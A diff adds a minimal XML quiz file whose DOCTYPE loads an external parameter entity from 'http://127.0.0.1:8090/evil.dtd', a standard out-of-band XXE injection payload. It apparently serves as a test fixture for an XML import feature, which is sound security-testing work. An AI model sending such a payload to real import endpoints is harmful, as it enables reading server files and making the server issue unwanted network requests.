@@ -1,0 +1,8 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE quiz [
+  <!ENTITY % dtd SYSTEM "http://127.0.0.1:8090/evil.dtd">
+  %dtd;
+]>
+<quiz>
+  <question type="description"><name><text>T</text></name></question>
+</quiz>
